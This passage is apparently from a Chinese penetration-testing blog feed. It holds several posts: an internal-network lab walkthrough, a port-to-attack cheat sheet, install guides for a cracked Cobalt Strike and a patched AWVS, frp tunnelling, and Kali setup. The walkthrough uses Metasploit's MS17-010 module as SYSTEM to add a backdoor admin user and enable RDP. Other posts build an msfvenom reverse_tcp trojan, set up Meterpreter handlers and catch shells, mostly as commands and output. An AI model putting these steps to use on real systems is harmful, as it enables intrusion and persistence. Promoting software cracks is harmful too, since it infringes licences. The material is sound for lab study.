<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; proxychains curl http:<span class="comment">//192.168.52.143</span></span><br><span class="line">[*] exec: proxychains curl http:<span class="comment">//192.168.52.143</span></span><br><span class="line">ProxyChains<span class="number">-3.1</span> (http:<span class="comment">//proxychains.sf.net)</span></span><br><span class="line">|S-chain|-&lt;&gt;<span class="number">-127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span>-&lt;&gt;&lt;&gt;<span class="number">-192.168</span><span class="number">.52</span><span class="number">.143</span>:<span class="number">80</span>-&lt;&gt;&lt;&gt;-OK</span><br></pre></td></tr></table></figure>
<p>扫描端口</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">proxychains nmap -p <span class="number">1</span><span class="number">-1000</span> -Pn -sT <span class="number">192.168</span><span class="number">.52</span><span class="number">.141</span></span><br></pre></td></tr></table></figure>
<p>扫出 135、139、445、21<br>21端口可以测试弱口令和vsftp漏洞<br>445端口可以测试ms17010和ms08067漏洞<br>尝试ms08067不成功<br>ms17010可以运行</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; use auxiliary/admin/smb/ms17_010_command </span><br><span class="line">msf5 auxiliary(admin/smb/ms17_010_command) &gt; <span class="keyword">set</span> rhosts <span class="comment">192.168.52.141</span></span><br><span class="line">rhosts <span class="comment">=&gt; 192.168.52.141</span></span><br><span class="line">msf5 <span class="comment">auxiliary(admin</span>/smb/<span class="comment">ms17_010_command) &gt; set command whoami</span></span><br><span class="line">command <span class="comment">=&gt; whoami</span></span><br><span class="line">msf5 <span class="comment">auxiliary(admin</span>/smb/<span class="comment">ms17_010_command) &gt; run</span></span><br><span class="line">nt <span class="comment">authority\system</span></span><br></pre></td></tr></table></figure>
<p>添加用户</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">set</span> command net<span class="built_in"> user </span>timor fuck!@#123-+ /add</span><br><span class="line">msf5 auxiliary(admin/smb/ms17_010_command) &gt; run</span><br></pre></td></tr></table></figure>
<p>开启3389</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">command</span> 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server <span class="string">/v</span> fDenyTSConnections <span class="string">/t</span> REG_DWORD <span class="string">/d</span> 00000000 <span class="string">/f</span>'</span><br><span class="line">msf5 auxiliary<span class="params">(admin/smb/ms17_010_command)</span> &gt; run</span><br></pre></td></tr></table></figure>
<p>给管理员权限</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">set</span> command net localgroup administrators timor /add</span><br><span class="line">msf5 auxiliary(admin/smb/ms17_010_command) &gt; run</span><br></pre></td></tr></table></figure>
<p>连接3389</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">proxychains rdesktop <span class="number">192.168</span><span class="number">.52</span><span class="number">.141</span></span><br></pre></td></tr></table></figure>
<p>还剩下一个192.168.52.138<br>扫描端口 </p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -p <span class="number">1</span><span class="number">-1000</span> <span class="number">192.168</span><span class="number">.52</span><span class="number">.138</span></span><br></pre></td></tr></table></figure>
<p>135、139、445、80<br>可以用msf17010攻击</p>
]]></content>
  </entry>
  <entry>
    <title>常见端口和服务</title>
    <url>/posts/ad4fd8bd.html</url>
    <content><![CDATA[<h2 id="常见端口和服务"><a href="#常见端口和服务" class="headerlink" title="常见端口和服务"></a>常见端口和服务</h2><a id="more"></a>
<table>
<thead>
<tr>
<th>端口</th>
<th align="center">服务说明</th>
<th align="right">攻击方法(漏洞)</th>
</tr>
</thead>
<tbody><tr>
<td>21</td>
<td align="center">FTP-文件传输协议</td>
<td align="right">默认密码、暴力破解密码、VSFTP某版本后门、嗅探</td>
</tr>
<tr>
<td>22</td>
<td align="center">ssh-远程登录会话</td>
<td align="right">弱口令、暴力破解密码</td>
</tr>
<tr>
<td>23</td>
<td align="center">Telent-远程登录服务</td>
<td align="right">弱口令、爆破、嗅探</td>
</tr>
<tr>
<td>25</td>
<td align="center">SMTP-简单邮件服务器</td>
<td align="right">无认证时可伪造发件人</td>
</tr>
<tr>
<td>53</td>
<td align="center">domain-DNS域名解析服务</td>
<td align="right">测试域传送漏洞、SPF / DMARC Check、DDoS（DNS Query Flood / DNS 反弹）</td>
</tr>
<tr>
<td>69</td>
<td align="center">TFTP-小型文件传输协议</td>
<td align="right">弱口令</td>
</tr>
<tr>
<td>80</td>
<td align="center">HTTP-超文本传输协议</td>
<td align="right">常见web漏洞</td>
</tr>
<tr>
<td>139</td>
<td align="center">NetBIOS/SMB服务</td>
<td align="right">爆破、远程代码执行</td>
</tr>
<tr>
<td>443</td>
<td align="center">HTTPS服务</td>
<td align="right">心脏滴血等与SSL有关的漏洞</td>
</tr>
<tr>
<td>445</td>
<td align="center">SMB服务端口</td>
<td align="right">MS17-010</td>
</tr>
<tr>
<td>873</td>
<td align="center">Rsync</td>
<td align="right">未授权访问</td>
</tr>
<tr>
<td>1433</td>
<td align="center">MSSQL数据库</td>
<td align="right">爆破、SQL注入</td>
</tr>
<tr>
<td>1521</td>
<td align="center">Oracle数据库</td>
<td align="right">SQL注入</td>
</tr>
<tr>
<td>2049</td>
<td align="center">NFS</td>
<td align="right">未授权访问</td>
</tr>
<tr>
<td>2181</td>
<td align="center">ZooKeeper监听端口</td>
<td align="right">未授权访问</td>
</tr>
<tr>
<td>2375</td>
<td align="center">Docker端口</td>
<td align="right">未授权访问</td>
</tr>
<tr>
<td>2601</td>
<td align="center">Zebra</td>
<td align="right">弱口令zebr</td>
</tr>
<tr>
<td>3306</td>
<td align="center">Mysql数据库</td>
<td align="right">爆破、SQL注入</td>
</tr>
<tr>
<td>3389</td>
<td align="center">Windows远程桌面服务</td>
<td align="right">弱口令、CVE-2019-0708、ms12-020</td>
</tr>
<tr>
<td>3690</td>
<td align="center">SVN服务</td>
<td align="right">未授权访问</td>
</tr>
<tr>
<td>4440</td>
<td align="center">Rundeck</td>
<td align="right">弱口令admin</td>
</tr>
<tr>
<td>4560</td>
<td align="center">log4j SocketServer监听的端口</td>
<td align="right">log4j&lt;=1.2.17反序列化漏洞（CVE-2019-17571）</td>
</tr>
<tr>
<td>4750</td>
<td align="center">BMC</td>
<td align="right">BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)</td>
</tr>
<tr>
<td>4848</td>
<td align="center">GlassFish控制台端口</td>
<td align="right">弱口令admin/adminadmin</td>
</tr>
<tr>
<td>5000</td>
<td align="center">SysBase/DB2数据库端口</td>
<td align="right">爆破、注入漏洞</td>
</tr>
<tr>
<td>5432</td>
<td align="center">PostGreSQL数据库</td>
<td align="right">爆破、注入</td>
</tr>
<tr>
<td>5632</td>
<td align="center">PyAnywhere服务端口</td>
<td align="right">代码执行漏洞</td>
</tr>
<tr>
<td>5900/5901</td>
<td align="center">VNC监听端口</td>
<td align="right">未授权访问</td>
</tr>
<tr>
<td>5984</td>
<td align="center">CouchDB端口</td>
<td align="right">未授权访问</td>
</tr>
<tr>
<td>6379</td>
<td align="center">Redis数据库端口</td>
<td align="right">Redis未授权访问漏洞</td>
</tr>
<tr>
<td>8009</td>
<td align="center">Tomcat AJP 协议</td>
<td align="right">CVE-2020-1938</td>
</tr>
<tr>
<td>7001/7002</td>
<td align="center">Weblogic</td>
<td align="right">Weblogic反序列化漏洞</td>
</tr>
<tr>
<td>8069</td>
<td align="center">Zabbix服务端口</td>
<td align="right">Zabbix弱口令 Getshell漏洞</td>
</tr>
<tr>
<td>8080</td>
<td align="center">Tomcat、JBoss</td>
<td align="right">omcat管理页面弱口令Getshell，JBoss未授权访问漏洞</td>
</tr>
<tr>
<td>8080-8090</td>
<td align="center"></td>
<td align="right">可能存在web服务</td>
</tr>
<tr>
<td>8089</td>
<td align="center">Jetty、Jenkins服务端口</td>
<td align="right">反序列化、控制台弱口令等漏洞</td>
</tr>
<tr>
<td>8161</td>
<td align="center">Apache ActiveMQ后台管理系统端口</td>
<td align="right">弱口令admin/admin、CVE-2016-3088漏洞</td>
</tr>
<tr>
<td>9000</td>
<td align="center">fastcgi端口</td>
<td align="right">远程命令执行漏洞</td>
</tr>
<tr>
<td>9001</td>
<td align="center">Supervisord</td>
<td align="right">远程命令执行漏洞(CVE-2017-11610)</td>
</tr>
<tr>
<td>9043/9090</td>
<td align="center">WebSphere</td>
<td align="right">WebSphere反序列化漏洞</td>
</tr>
<tr>
<td>9200/9300</td>
<td align="center">Elasticsearch监听端口</td>
<td align="right">Elasticsearch未授权访问漏洞</td>
</tr>
<tr>
<td>9990</td>
<td align="center">jboss</td>
<td align="right">远程代码执行、Java反序列化</td>
</tr>
<tr>
<td>10000</td>
<td align="center">Webmin-Web控制面板</td>
<td align="right">弱口令</td>
</tr>
<tr>
<td>10001/10002</td>
<td align="center">JmxRemoteLifecycleListener监听</td>
<td align="right">Tomcat反序列化漏洞(CVE-2016-8735)</td>
</tr>
<tr>
<td>11211</td>
<td align="center">Memcached监听端口</td>
<td align="right">Memcached未授权访问漏洞</td>
</tr>
<tr>
<td>27017/27018</td>
<td align="center">MongoDB数据库端口</td>
<td align="right">MongoDB未授权访问漏洞</td>
</tr>
<tr>
<td>50000</td>
<td align="center">SAP Management Console服务端口</td>
<td align="right">远程命令执行漏洞。</td>
</tr>
<tr>
<td>50070</td>
<td align="center">Hadoop服务端口</td>
<td align="right">Hadoop未授权访问漏洞</td>
</tr>
<tr>
<td>61616</td>
<td align="center">Apache ActiveMQ服务端口</td>
<td align="right">Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）</td>
</tr>
</tbody></table>
]]></content>
  </entry>
  <entry>
    <title>Cobalt Strike 安装</title>
    <url>/posts/431a3a09.html</url>
    <content><![CDATA[<img src="/posts/431a3a09/1.jpg" class="" title="This is an 1 image">
<a id="more"></a>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Cobalt Strike 分为客户端和服务端，可分布式操作、协同作战。服务器端只能运行在Linux系统中，可搭建在VPS上。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Cobalt Strike 1.4 破解汉化版<br>服务器：Centos 7.6<br>客户端：Windows 10</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>上传CS到服务端<br>安装java环境</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">yum install -y java<span class="number">-1.8</span><span class="number">.0</span>-openjdk*</span><br></pre></td></tr></table></figure>
<p>赋权</p>
<figure class="highlight gml"><table><tr><td class="code"><pre><span class="line">chmod +<span class="symbol">x</span> teamserver</span><br></pre></td></tr></table></figure>
<p>执行</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">./teamserver<span class="built_in"> IP </span>pass</span><br></pre></td></tr></table></figure>

<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>要配置好Java环境<br>运行<code>cobaltstrike.bat</code></p>
<img src="/posts/431a3a09/2.png" class="" title="This is an 2 image">
<img src="/posts/431a3a09/3.png" class="" title="This is an 3 image">

<h2 id="简单的攻击"><a href="#简单的攻击" class="headerlink" title="简单的攻击"></a>简单的攻击</h2><p>创建监听器</p>
<img src="/posts/431a3a09/4.png" class="" title="This is an 4 image">
<p>创建payload</p>
<img src="/posts/431a3a09/5.png" class="" title="This is an 5 image">
<p>把exe文件放到靶机内运行</p>
<img src="/posts/431a3a09/6.png" class="" title="This is an 6 image">
<img src="/posts/431a3a09/7.png" class="" title="This is an 7 image">
<p>完成</p>
<h2 id="结合msf反弹shell"><a href="#结合msf反弹shell" class="headerlink" title="结合msf反弹shell"></a>结合msf反弹shell</h2><p>打开kali开启msf</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lhost 127.0.0.1</span><br><span class="line">lhost =&gt; 127.0.0.1</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 1.</span><br><span class="line">[*] Exploit completed, but <span class="literal">no</span> session was created.</span><br><span class="line"></span><br><span class="line">[!] You are binding <span class="keyword">to</span> a loopback<span class="built_in"> address </span>by setting LHOST <span class="keyword">to</span> 127.0.0.1. Did you want ReverseListenerBindAddress?</span><br><span class="line">[*] Started reverse TCP handler on 127.0.0.1:4444</span><br></pre></td></tr></table></figure>
<p>在靶机中使用CS创建一个windows/foreign/reverse_tcp<br>host 填写为msf的ip，port填写刚才设置的ip</p>
<img src="/posts/431a3a09/8.png" class="" title="This is an 8 image">
<p>配置后门</p>
<img src="/posts/431a3a09/9.png" class="" title="This is an 9 image">
<p>在靶机上运行<br>回到kali中查看msf</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; [*] Sending stage (<span class="number">180291</span> bytes) to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">4444</span> -&gt; <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">36264</span>) at <span class="number">2020</span><span class="number">-03</span><span class="number">-03</span> <span class="number">01</span>:<span class="number">28</span>:<span class="number">06</span> <span class="number">-0500</span></span><br></pre></td></tr></table></figure>
<p>成功获得会话</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
  <entry>
    <title>Frp-内网穿透工具</title>
    <url>/posts/59b4f38.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp 协议，为 http 和 https 应用协议提供了额外的能力，且尝试性支持了点对点穿透。</p>
<a id="more"></a>
<h2 id="环境搭建准备"><a href="#环境搭建准备" class="headerlink" title="环境搭建准备"></a>环境搭建准备</h2><p>连接终端的工具:CRT<br>服务端：一台服务器（我用的是CentOS的）有外网固定IP<br>客户端：Kali虚拟机（能联网）</p>
<h2 id="安装配置frp"><a href="#安装配置frp" class="headerlink" title="安装配置frp"></a>安装配置frp</h2><p>下载frp地址：<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a><br>找到最新版的releases下载，系统版本自行确认。</p>
<h3 id="CentOS配置"><a href="#CentOS配置" class="headerlink" title="CentOS配置"></a>CentOS配置</h3><h4 id="下载frp"><a href="#下载frp" class="headerlink" title="下载frp"></a>下载frp</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[<span class="symbol">root@</span>VM_16_6_centos home]# wget https:<span class="comment">//github.com/fatedier/frp/releases/download/v0.31.2/frp_0.31.2_linux_amd64.tar.gz</span></span><br><span class="line">[<span class="symbol">root@</span>VM_16_6_centos home]# tar -zxvf frp_0<span class="number">.31</span><span class="number">.2</span>_linux_amd64.tar.gz</span><br><span class="line">[<span class="symbol">root@</span>VM_16_6_centos home]# cd frp_0<span class="number">.31</span><span class="number">.2</span>_linux_amd64/</span><br><span class="line">[<span class="symbol">root@</span>VM_16_6_centos frp_0<span class="number">.31</span><span class="number">.2</span>_linux_amd64]# rm -rf frpc*</span><br></pre></td></tr></table></figure>
<h4 id="添加配置内容"><a href="#添加配置内容" class="headerlink" title="添加配置内容"></a>添加配置内容</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[<span class="symbol">root@</span>VM_16_6_centos frp_0<span class="number">.31</span><span class="number">.2</span>_linux_amd64]# vi frps.ini</span><br></pre></td></tr></table></figure>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="comment">#服务器和客户端的通讯接口</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span> </span><br><span class="line"><span class="comment">#监控页面的web地址</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7500</span></span><br><span class="line"><span class="comment">#账号</span></span><br><span class="line"><span class="attr">dashboard_user</span> = admin </span><br><span class="line"><span class="comment">#密码</span></span><br><span class="line"><span class="attr">dashboard_pwd</span> = admin</span><br></pre></td></tr></table></figure>
<h4 id="运行frps"><a href="#运行frps" class="headerlink" title="运行frps"></a>运行frps</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[<span class="symbol">root@</span>VM_16_6_centos frp_0<span class="number">.31</span><span class="number">.2</span>_linux_amd64]# ./frps -c frps.ini</span><br></pre></td></tr></table></figure>
<h3 id="Kali配置"><a href="#Kali配置" class="headerlink" title="Kali配置"></a>Kali配置</h3><h4 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h4><p>编辑配置文件</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># vi /etc/ssh/sshd_config</span></span><br></pre></td></tr></table></figure>
<p>在配置文件第一行加入</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">PermitRootLogin</span> <span class="literal">yes</span></span><br></pre></td></tr></table></figure>
<p>重启ssh并设置开机自启</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># systemctl restart ssh</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># systemctl enable ssh</span></span><br></pre></td></tr></table></figure>
<h4 id="下载frp-1"><a href="#下载frp-1" class="headerlink" title="下载frp"></a>下载frp</h4><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop</span><span class="comment"># wget https://github.com/fatedier/frp/releases/download/v0.31.2/frp_0.31.2_linux_arm64.tar.gz</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop</span><span class="comment"># tar -zxvf frp_0.31.2_linux_arm64.tar.gz</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop</span><span class="comment"># cd frp_0.31.2_linux_arm64.tar.gz</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/frp_0</span>.<span class="number">31.2_</span>linux_amd64<span class="comment"># rm -rf frps*</span></span><br></pre></td></tr></table></figure>
<h4 id="添加配置内容-1"><a href="#添加配置内容-1" class="headerlink" title="添加配置内容"></a>添加配置内容</h4><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment">#frps的ip和端口</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">1.1</span>.<span class="number">1.1</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># kali ssh的配置</span></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">2322</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span></span><br><span class="line"><span class="comment"># kali msf的配置</span></span><br><span class="line"><span class="section">[msf]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">4444</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">2333</span></span><br></pre></td></tr></table></figure>
<p>意思就是将kali的22端口映射到外网IP的2322端口，将kali的4444端口映射到外网IP的2333端口。</p>
<h4 id="运行frpc"><a href="#运行frpc" class="headerlink" title="运行frpc"></a>运行frpc</h4><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/frp_0</span>.<span class="number">31.2_</span>linux_amd64<span class="comment"># ./frpc -c frpc.ini</span></span><br></pre></td></tr></table></figure>

<h3 id="关闭frp"><a href="#关闭frp" class="headerlink" title="关闭frp"></a>关闭frp</h3><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">ps -aux|<span class="keyword">grep</span> frp| <span class="keyword">grep</span> -v <span class="keyword">grep</span></span><br><span class="line"><span class="keyword">kill</span> -<span class="number">9</span> 进程号</span><br></pre></td></tr></table></figure>
<h3 id="ssh连接测试"><a href="#ssh连接测试" class="headerlink" title="ssh连接测试"></a>ssh连接测试</h3><p>使用CRT连接 输入服务端IP和设置的2232端口</p>
<h3 id="msf攻击测试"><a href="#msf攻击测试" class="headerlink" title="msf攻击测试"></a>msf攻击测试</h3><h4 id="使用msfvenom生成exe木马"><a href="#使用msfvenom生成exe木马" class="headerlink" title="使用msfvenom生成exe木马"></a>使用msfvenom生成exe木马</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=服务端IP <span class="attribute">LPORT</span>=服务端端口 -f exe &gt; timor.exe</span><br></pre></td></tr></table></figure>
<h4 id="启动msf监听反弹的shell"><a href="#启动msf监听反弹的shell" class="headerlink" title="启动msf监听反弹的shell"></a>启动msf监听反弹的shell</h4><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># msfconsole</span></span><br></pre></td></tr></table></figure>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/<span class="keyword">handler</span></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> lhost <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> lport <span class="number">4444</span></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; run</span><br></pre></td></tr></table></figure>
<p>成功！</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
        <tag>Frp</tag>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>AWVS Linux 破解版在 Centos7 下安装过程</title>
    <url>/posts/d2a75358.html</url>
    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>下载AWVS安装包及破解文件</p>
<a id="more"></a>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>环境： Centos 7.6<br>安装依赖包</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">yum</span> <span class="selector-tag">install</span> <span class="selector-tag">libXrender</span>  <span class="selector-tag">libXext</span> <span class="selector-tag">libXcursor</span>  <span class="selector-tag">libXfixes</span> <span class="selector-tag">libXcomposite</span> <span class="selector-tag">libXrandr</span> <span class="selector-tag">libXdamage</span>  <span class="selector-tag">libXtst</span> <span class="selector-tag">libXi</span> <span class="selector-tag">cups-libs</span> <span class="selector-tag">dbus-glib</span> <span class="selector-tag">libXrandr</span> <span class="selector-tag">libXcursor</span> <span class="selector-tag">libXinerama</span> <span class="selector-tag">cairo</span> <span class="selector-tag">cairo-gobject</span> <span class="selector-tag">pango</span>  <span class="selector-tag">libXScrnSaver</span> <span class="selector-tag">libatk-bridge-2</span><span class="selector-class">.0</span><span class="selector-class">.so</span><span class="selector-class">.0</span> <span class="selector-tag">libgdk-3</span><span class="selector-class">.so</span><span class="selector-class">.0</span> <span class="selector-tag">libgtk-3</span><span class="selector-class">.so</span><span class="selector-class">.0</span> <span class="selector-tag">libgdk_pixbuf-2</span><span class="selector-class">.0</span><span class="selector-class">.so</span><span class="selector-class">.0</span> <span class="selector-tag">-y</span></span><br></pre></td></tr></table></figure>
<p>给安装文件赋予权限 </p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">chmod</span> <span class="selector-tag">a</span>+<span class="selector-tag">x</span> <span class="selector-tag">acunetix_12</span><span class="selector-class">.0</span><span class="selector-class">.191218085_x64</span><span class="selector-class">.sh</span></span><br></pre></td></tr></table></figure>
<p>执行文件</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">./acunetix_12<span class="number">.0</span><span class="number">.191218085</span>_x64.sh</span><br></pre></td></tr></table></figure>
<p>按照提示，脚本交互式输入用户信息:</p>
<ol>
<li>是否同意协议: yes</li>
<li>输入主机名: (可是输入IP地址)</li>
<li>输入管理员邮箱:  <a href="mailto:123456@qq.com">123456@qq.com</a></li>
<li>输入密码:<br>安装成功<br>给破解文件权限<figure class="highlight glsl"><table><tr><td class="code"><pre><span class="line">chmod a+x <span class="keyword">patch</span></span><br></pre></td></tr></table></figure>
执行破解文件<figure class="highlight glsl"><table><tr><td class="code"><pre><span class="line">./<span class="keyword">patch</span></span><br></pre></td></tr></table></figure>
发现报错<br>./patch: /lib64/libstdc++.so.6: version GLIBCXX_3.4.21’ not found (required by ./patch)</li>
</ol>
<p>看到了这个文章<br><a href="https://blog.csdn.net/salman_tan/article/details/83147827" target="_blank" rel="noopener">https://blog.csdn.net/salman_tan/article/details/83147827</a><br>就可以解决<br>然后执行</p>
<figure class="highlight glsl"><table><tr><td class="code"><pre><span class="line">./<span class="keyword">patch</span></span><br></pre></td></tr></table></figure>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Input</span> your license_key:9999-9999-9999</span><br><span class="line"><span class="keyword">Input</span> your company:<span class="keyword">test</span></span><br><span class="line"><span class="keyword">Input</span> your name:<span class="keyword">test</span></span><br><span class="line"><span class="keyword">Input</span> your phone:<span class="keyword">test</span></span><br><span class="line"><span class="keyword">Input</span> your email:<span class="keyword">test</span></span><br><span class="line"><span class="keyword">Input</span> your country:<span class="keyword">test</span></span><br><span class="line"><span class="keyword">Input</span> your max_engines:999</span><br><span class="line"><span class="keyword">Input</span> your max_targets:999999</span><br></pre></td></tr></table></figure>
<p>就可以了</p>
<p>【前提-卸载已有版本】：首先必须要卸载原有的awvs12，或者其它老的版本，如果你没有安装过，可以忽略这段落。懒得打你就复制命令。懒得打你就复制命令。懒得打你就复制命令。<br>直接执行以下命令进行卸载。</p>
<p>##停止服务，<br>systemctl stop acunetix_trial.service<br>##第一步，删除软件安装的目录。<br>rm -rf /home/acunetix/<br>##第二步，删除awvs建立的用户。在/etc/passwd 里面<br>userdel acunetix<br>##不管怎么样，重启一下<br>reboot<br>【安装前奏-准备环境–必要】：再说一次，我是CentOS Linux release 7.6.181</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>AWVS</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux基础配置</title>
    <url>/posts/2f7b2975.html</url>
    <content><![CDATA[<img src="/posts/2f7b2975/0.png" class="" title="This is an 0 image">
<a id="more"></a>
<h2 id="下载Kali-Linux"><a href="#下载Kali-Linux" class="headerlink" title="下载Kali Linux"></a>下载Kali Linux</h2><p>下载网址：<a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">https://www.kali.org/downloads/</a><br>我使用的是VMware的所以我下载对应的版本</p>
<img src="/posts/2f7b2975/1.png" class="" title="This is an 1 image">
<h2 id="软件更新"><a href="#软件更新" class="headerlink" title="软件更新"></a>软件更新</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 我习惯一次升级所有软件</span></span><br><span class="line">apt-<span class="builtin-name">get</span> update &amp;&amp; apt-<span class="builtin-name">get</span><span class="built_in"> upgrade </span>&amp;&amp; apt-<span class="builtin-name">get</span> clean</span><br></pre></td></tr></table></figure>
<h2 id="Kali-2019-4-中文乱码解决问题"><a href="#Kali-2019-4-中文乱码解决问题" class="headerlink" title="Kali 2019.4 中文乱码解决问题"></a>Kali 2019.4 中文乱码解决问题</h2><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br><span class="line"><span class="comment">//设置编码字体为：zh_CN.UTF-8 UTF-8 和 en_US.UTF-8 UTF-8</span></span><br><span class="line"><span class="comment">//空格为选中 tab为切换  回车确定</span></span><br><span class="line"><span class="comment">//选中 zh_CN.UTF-8 UTF-8 为默认</span></span><br><span class="line"><span class="meta"># 安装中文字体</span></span><br><span class="line">apt-<span class="keyword">get</span> install  fonts-wqy-microhei </span><br><span class="line">apt-<span class="keyword">get</span> install  fonts-wqy-zenhei </span><br><span class="line"><span class="meta"># 重启</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>

